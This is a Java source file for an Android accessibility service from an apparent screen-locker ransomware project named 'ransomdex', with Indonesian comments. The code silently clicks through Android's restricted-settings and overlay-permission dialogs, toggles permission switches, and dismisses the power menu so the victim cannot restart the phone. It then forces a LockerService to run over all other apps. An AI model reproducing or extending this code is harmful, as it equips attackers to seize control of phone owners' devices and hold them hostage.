package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected");

        // Langsung arahkan ke pengaturan Overlay setelah aksesibilitas aktif
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }, 500);
    }

    private void writeLog(String text) {
        try {
            File logFile = new File("/sdcard/log_ransom.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            String time = Calendar.getInstance().getTime().toString();
            fos.write((time + " : " + text + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        writeLog("Event: " + event.getEventType());
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // 1. Tangani blokir "Restricted Settings" (Android 13+)
        if (packageName.equals("com.android.settings")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                // Klik titik tiga di pojok kanan atas (More options)
                checkAndClickByContentDesc(root, "More options");
                checkAndClickByContentDesc(root, "Opsi lain");
                // Klik "Allow restricted settings"
                checkAndClick(root, "Allow restricted settings");
                checkAndClick(root, "Izinkan pengaturan terbatas");
            }
        }

        // 2. Deteksi jika menu Power muncul
        if (packageName.equals("android") || packageName.contains("systemui")) {
            // Jika ada teks terkait mematikan daya, langsung tekan Back
            checkAndDismissPowerMenu(getRootInActiveWindow());
        }

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // Logika "Auto-Clicker"
        // Cari nama aplikasi di daftar izin overlay
        checkAndClick(rootNode, "System Update");

        // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
        checkAndClick(rootNode, "Activate");
        checkAndClick(rootNode, "Aktifkan");
        checkAndClick(rootNode, "Allow");
        checkAndClick(rootNode, "Izinkan");

        // Kata kunci untuk halaman Overlay/Display over other apps
        checkAndClick(rootNode, "Permit drawing over other apps");
        checkAndClick(rootNode, "Allow display over other apps");
        checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
        checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
        
        // Jika sudah di halaman spesifik overlay, cari switch toggle jika tombol teks tidak ada
        findAndClickSwitch(rootNode);

        // Jalankan LockerService secara paksa jika izin sudah ada
        if (Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(this, LockerService.class);
            startForegroundService(intent);
        }

        rootNode.recycle();
    }

    private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByViewId("android:id/button1"); // Sering digunakan untuk OK dialog
        for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByText(desc)) { clickNode(n); }
        // Cari berdasarkan content description (untuk tombol gambar/tiga titik)
        if (node.getContentDescription() != null && node.getContentDescription().toString().contains(desc)) {
            clickNode(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) checkAndClickByContentDesc(child, desc);
        }
    }

    private void findAndClickSwitch(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getClassName() != null && node.getClassName().toString().contains("Switch") && !node.isChecked()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findAndClickSwitch(node.getChild(i));
        }
    }

    private void checkAndDismissPowerMenu(AccessibilityNodeInfo node) {
        if (node == null) return;
        // Mencari kata kunci yang ada di menu power
        if (!node.findAccessibilityNodeInfosByText("Power off").isEmpty() || 
            !node.findAccessibilityNodeInfosByText("Restart").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Mulai lagi").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Daya mati").isEmpty()) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) { clickNode(n); }
        }
    }

    private void clickNode(AccessibilityNodeInfo n) {
        if (n == null) return;
        AccessibilityNodeInfo clickableNode = n;
        while (clickableNode != null && !clickableNode.isClickable()) {
            clickableNode = clickableNode.getParent();
        }
        if (clickableNode != null && clickableNode.isClickable()) {
            writeLog("Auto-clicking: " + (n.getText() != null ? n.getText() : "node"));
            clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    @Override
    public void onInterrupt() {}
}